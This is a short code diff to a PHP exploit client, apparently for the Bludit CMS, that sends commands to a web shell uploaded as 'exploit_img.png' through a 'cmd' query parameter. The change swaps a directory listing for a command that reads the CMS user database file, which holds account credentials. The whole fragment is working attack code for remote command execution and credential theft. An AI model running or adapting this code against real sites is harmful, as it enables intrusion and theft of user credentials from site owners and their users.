@@ -181,7 +181,8 @@ class BluditClient
     {
         $url = rtrim($this->baseUrl, '/') . '/' . ltrim('/bl-content/tmp/exploit_img.png', '/');
         $url = $url . '?' . http_build_query([
-                'cmd' => 'ls -lsa'
+                // 'cmd' => 'ls -lsa'
+                'cmd' => 'cat ../../bl-content/databases/users.php'
             ]);
 
         $this->logger->info('Sending HTTP GET request', [
